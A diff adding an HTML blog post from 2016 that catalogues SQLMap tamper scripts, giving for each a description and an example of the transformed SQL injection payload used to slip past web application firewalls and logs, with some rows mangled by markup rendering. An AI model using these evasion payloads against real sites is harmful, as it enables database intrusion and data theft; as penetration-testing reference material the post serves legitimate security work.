@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.17-DEV" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://www.forkbombers.com/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://www.forkbombers.com/index.xml" type="application/rss+xml" title="#forkbombers">
+<title>SQLMap Tamper Scripts Update - #forkbombers</title>
+</head>
+<body>
+
+<header>
+  <div class="container clearfix">
+    <a class="path" href="http://www.forkbombers.com/">[#forkbombers]</a>
+    <span class="caret"># _</span>
+    <div class="right">
+      
+    </div>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2016-07-04">July 04, 2016</time></span>
+
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://www.forkbombers.com/tags/sqli">sqli</a>
+
+        <a href="http://www.forkbombers.com/tags/sqlmap">sqlmap</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">SQLMap Tamper Scripts Update</h1>
+  <section class="body" itemprop="articleBody">
+    <p>So my last post from three years ago was pretty well received, with the rate at which SQLMap is developed it is definitely behind.r,</p>
+
+<p>Here&rsquo;s an updated graph of all tamper scripts included with the latest version (as of time of writing, 04/July/2016).</p>
+
+<p>I will be putting something together, possibly as a commit to the SQLMap project to aid with these. Will update once done so stay tuned.</p>
+
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Name</td>
+<td>Description</td>
+<td>Example</td>
+</tr>
+
+<tr>
+<td>apostrophemask.py</td>
+<td>Replaces apostrophe character with its UTF-8 full width counterpart</td>
+<td>&lsquo;1 AND %EF%BC%871%EF%BC%87=%EF%BC%871&rsquo;</td>
+</tr>
+
+<tr>
+<td>apostrophenullencode.py</td>
+<td>Replaces apostrophe character with its illegal double unicode counterpart</td>
+<td>&lsquo;1 AND %271%27=%271&rsquo;</td>
+</tr>
+
+<tr>
+<td>appendnullbyte.py</td>
+<td>Appends encoded NULL byte character at the end of payload</td>
+<td>&lsquo;1 AND 1=1&rsquo;</td>
+</tr>
+
+<tr>
+<td>base64encode.py</td>
+<td>Base64 all characters in a given payload</td>
+<td>&lsquo;MScgQU5EIFNMRUVQKDUpIw==&rsquo;</td>
+</tr>
+
+<tr>
+<td>between.py</td>
+<td>Replaces greater than operator (&lsquo;&gt;&rsquo;) with &lsquo;NOT BETWEEN 0 AND #&rsquo;</td>
+<td>&lsquo;1 AND A NOT BETWEEN 0 AND B&ndash;&rsquo;</td>
+</tr>
+
+<tr>
+<td>bluecoat.py</td>
+<td>Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator</td>
+<td>&lsquo;SELECT%09id FROM users where id LIKE 1&rsquo;</td>
+</tr>
+
+<tr>
+<td>chardoubleencode.py</td>
+<td>Double url-encodes all characters in a given payload (not processing already encoded)</td>
+<td>&rsquo;%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545&rsquo;</td>
+</tr>
+
+<tr>
+<td>commalesslimit.py</td>
+<td>Replaces instances like &lsquo;LIMIT M, N&rsquo; with &lsquo;LIMIT N OFFSET M&rsquo;</td>
+<td>&ldquo;LIMIT 3 OFFSET 2&rdquo;</td>
+</tr>
+
+<tr>
+<td>commalessmid.py</td>
+<td>Replaces instances like &lsquo;MID(A, B, C)&rsquo; with &lsquo;MID(A FROM B FOR C)&rsquo;</td>
+<td>&lsquo;MID(VERSION() FROM 1 FOR 1)&rsquo;</td>
+</tr>
+
+<tr>
+<td>concat2concatws.py</td>
+<td>Replaces instances like &lsquo;CONCAT(A, B)&rsquo; with &lsquo;CONCAT_WS(MID(CHAR(0), 0, 0), A, B)&rsquo;</td>
+<td>&lsquo;CONCAT_WS(MID(CHAR(0),0,0),1,2)&rsquo;</td>
+</tr>
+
+<tr>
+<td>charencode.py</td>
+<td>Url-encodes all characters in a given payload (not processing already encoded)</td>
+<td>&rsquo;%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45&rsquo;</td>
+</tr>
+
+<tr>
+<td>charunicodeencode.py</td>
+<td>Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)</td>
+<td>&rsquo;%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045&rsquo;</td>
+</tr>
+
+<tr>
+<td>equaltolike.py</td>
+<td>Replaces all occurances of operator equal (&lsquo;=&rsquo;) with operator &lsquo;LIKE&rsquo;</td>
+<td>&lsquo;SELECT * FROM users WHERE id LIKE 1&rsquo;</td>
+</tr>
+
+<tr>
+<td>escapequotes.py</td>
+<td>Slash escape quotes (&rsquo; and &ldquo;)</td>
+<td>&lsquo;1\\&rdquo; AND SLEEP(5)#&rsquo;</td>
+</tr>
+
+<tr>
+<td>greatest.py</td>
+<td>Replaces greater than operator (&lsquo;&gt;&rsquo;) with &lsquo;GREATEST&rsquo; counterpart</td>
+<td>&lsquo;1 AND GREATEST(A,B+1)=A&rsquo;</td>
+</tr>
+
+<tr>
+<td>halfversionedmorekeywords.py</td>
+<td>Adds versioned MySQL comment before each keyword</td>
+<td>&ldquo;value&rsquo;/<em>!0UNION/</em>!0ALL/<em>!0SELECT/</em>!0CONCAT(/<em>!0CHAR(58,107,112,113,58),/</em>!0IFNULL(CAST(/<em>!0CURRENT_USER()/</em>!0AS/<em>!0CHAR),/</em>!0CHAR(32)),/<em>!0CHAR(58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND &lsquo;QDWa&rsquo;=&lsquo;QDWa&rdquo;</td>
+</tr>
+
+<tr>
+<td>ifnull2ifisnull.py</td>
+<td>Replaces instances like &lsquo;IFNULL(A, B)&rsquo; with &lsquo;IF(ISNULL(A), B, A)&rsquo;</td>
+<td>&lsquo;IF(ISNULL(1),2,1)&rsquo;</td>
+</tr>
+
+<tr>
+<td>modsecurityversioned.py</td>
+<td>Embraces complete query with versioned comment</td>
+<td>&lsquo;1 /<em>!30874AND 2&gt;1</em>/&ndash;&rsquo;</td>
+</tr>
+
+<tr>
+<td>modsecurityzeroversioned.py</td>
+<td>Embraces complete query with zero-versioned comment</td>
+<td>&lsquo;1 /<em>!00000AND 2&gt;1</em>/&ndash;&rsquo;</td>
+</tr>
+
+<tr>
+<td>multiplespaces.py</td>
+<td>Adds multiple spaces around SQL keywords</td>
+<td>&lsquo;1 UNION SELECT foobar&rsquo;</td>
+</tr>
+
+<tr>
+<td>nonrecursivereplacement.py</td>
+<td>Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(&ldquo;SELECT&rdquo;, &ldquo;&rdquo;)) filters</td>
+<td>&lsquo;1 UNIOUNIONN SELESELECTCT 2&ndash;&rsquo;</td>
+</tr>
+
+<tr>
+<td>percentage.py</td>
+<td>Adds a percentage sign (&lsquo;%&rsquo;) infront of each character</td>
+<td>&rsquo;%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E&rsquo;</td>
+</tr>
+
+<tr>
+<td>overlongutf8.py</td>
+<td>Converts all characters in a given payload (not processing already encoded)</td>
+<td>&lsquo;SELECT%C0%AAFIELD%C0%AAFROM%C0%AATABLE%C0%AAWHERE%C0%AA2%C0%BE1&rsquo;</td>
+</tr>
+
+<tr>
+<td>randomcase.py</td>
+<td>Replaces each keyword character with random case value</td>
+<td>&lsquo;INseRt&rsquo;</td>
+</tr>
+
+<tr>
+<td>randomcomments.py</td>
+<td>Add random comments to SQL keywords</td>
+<td>&lsquo;I/<strong>/N/</strong>/SERT&rsquo;</td>
+</tr>
+
+<tr>
+<td>securesphere.py</td>
+<td>Appends special crafted string</td>
+<td>&ldquo;1 AND 1=1 and &lsquo;0having&rsquo;=&lsquo;0having&rsquo;&rdquo;</td>
+</tr>
+
+<tr>
+<td>sp_password.py</td>
+<td>Appends &lsquo;sp_password&rsquo; to the end of the payload for automatic obfuscation from DBMS logs</td>
+<td>&lsquo;1 AND 9227=9227&ndash; sp_password&rsquo;</td>
+</tr>
+
+<tr>
+<td>space2comment.py</td>
+<td>Replaces space character (&rsquo; &lsquo;) with comments &lsquo;/**/&rsquo;</td>
+<td>&lsquo;SELECT/<strong>/id/</strong>/FROM/**/users&rsquo;</td>
+</tr>
+
+<tr>
+<td>space2dash.py</td>
+<td>Replaces space character (&rsquo; &lsquo;) with a dash comment (&rsquo;&ndash;&lsquo;) followed by a random string and a new line (&rsquo;\n&rsquo;)</td>
+<td>&lsquo;1&ndash;nVNaVoPYeva%0AAND&ndash;ngNvzqu%0A9227=9227&rsquo;</td>
+</tr>
+
+<tr>
+<td>space2hash.py</td>
+<td>Replaces space character (&rsquo; &lsquo;) with a pound character (&rsquo;#&lsquo;) followed by a random string and a new line (&rsquo;\n&rsquo;)</td>
+<td>&lsquo;1%23nVNaVoPYeva%0AAND%23ngNvzqu%0A9227=9227&rsquo;</td>
+</tr>
+
+<tr>
+<td>space2morehash.py</td>
+<td>Replaces space character (&rsquo; &lsquo;) with a pound character (&rsquo;#&lsquo;) followed by a random string and a new line (&rsquo;\n&rsquo;)</td>
+<td>&lsquo;1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227&rsquo;</td>
+</tr>
+
+<tr>
+<td>space2mssqlblank.py</td>
+<td>Replaces space character (&rsquo; &lsquo;) with a random blank character from a valid set of alternate characters</td>
+<td>&lsquo;SELECT%0Eid%0DFROM%07users&rsquo;</td>
+</tr>
+
+<tr>
+<td>space2mssqlhash.py</td>
+<td>Replaces space character (&rsquo; &lsquo;) with a pound character (&rsquo;#&lsquo;) followed by a new line (&rsquo;\n&rsquo;)</td>
+<td>&lsquo;1%23%0AAND%23%0A9227=9227&rsquo;</td>
+</tr>
+
+<tr>
+<td>space2mysqlblank.py</td>
+<td>Replaces space character (&rsquo; &lsquo;) with a random blank character from a valid set of alternate characters</td>
+<td>&lsquo;SELECT%A0id%0BFROM%0Cusers&rsquo;</td>
+</tr>
+
+<tr>
+<td>space2mysqldash.py</td>
+<td>Replaces space character (&rsquo; &lsquo;) with a dash comment (&rsquo;&ndash;&lsquo;) followed by a new line (&rsquo;\n&rsquo;)</td>
+<td>&lsquo;1&ndash;%0AAND&ndash;%0A9227=9227&rsquo;</td>
+</tr>
+
+<tr>
+<td>space2plus.py</td>
+<td>Replaces space character (&rsquo; &lsquo;) with plus (&rsquo;+&lsquo;)</td>
+<td>&lsquo;SELECT+id+FROM+users&rsquo;</td>
+</tr>
+
+<tr>
+<td>space2randomblank.py</td>
+<td>Replaces space character (&rsquo; &lsquo;) with a random blank character from a valid set of alternate characters</td>
+<td>&lsquo;SELECT%0Did%0DFROM%0Ausers&rsquo;</td>
+</tr>
+
+<tr>
+<td>symboliclogical.py</td>
+<td>Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and</td>
+<td></td>
+</tr>
+
+<tr>
+<td>unionalltounion.py</td>
+<td>Replaces UNION ALL SELECT with UNION SELECT</td>
+<td>&rsquo;-1 UNION SELECT&rsquo;</td>
+</tr>
+
+<tr>
+<td>unmagicquotes.py</td>
+<td>Replaces quote character (&lsquo;) with a multi-byte combo %bf%27 together with generic comment at the end (to make it work)</td>
+<td>&lsquo;1%bf%27 AND 1=1&ndash; &lsquo;</td>
+</tr>
+
+<tr>
+<td>uppercase.py</td>
+<td>Replaces each keyword character with upper case value</td>
+<td>&lsquo;INSERT&rsquo;</td>
+</tr>
+
+<tr>
+<td>varnish.py</td>
+<td>Append a HTTP header &lsquo;X-originating-IP&rsquo;</td>
+<td><a href="http://h30499.www3.hp.com/t5/Fortify-Application-Security/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366">http://h30499.www3.hp.com/t5/Fortify-Application-Security/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366</a></td>
+</tr>
+
+<tr>
+<td>versionedkeywords.py</td>
+<td>Encloses each non-function keyword with versioned MySQL comment</td>
+<td>&lsquo;1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</td>
+</tr>
+
+<tr>
+<td>versionedmorekeywords.py</td>
+<td>Encloses each keyword with versioned MySQL comment</td>
+<td>&lsquo;1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURRENT_USER</em>/()/<em>!AS</em>//<em>!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#&rsquo;</td>
+</tr>
+
+<tr>
+<td>xforwardedfor.py</td>
+<td>Append a fake HTTP header &lsquo;X-Forwarded-For&rsquo;</td>
+<td>&rsquo; headers[&ldquo;X-Forwarded-For&rdquo;]&rsquo;</td>
+</tr>
+</tbody>
+</table>
+
+
+	<br /><br /><br />
+	<div id="disqus_thread"></div>
+    <script>
+        
+
+		 
+        var disqus_config = function () {
+            this.page.url = 'http:\/\/www.forkbombers.com\/';  
+            this.page.identifier = '\/2016\/07\/sqlmap-tamper-scripts-update.html'; 
+        };
+
+        (function() {  
+            var d = document, s = d.createElement('script');
+            s.src = '//forkbomberscom.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <script id="dsq-count-scr" src="//forkbomberscom.disqus.com/count.js" async></script>
+  </section>
+
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2016  #forkbombers - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
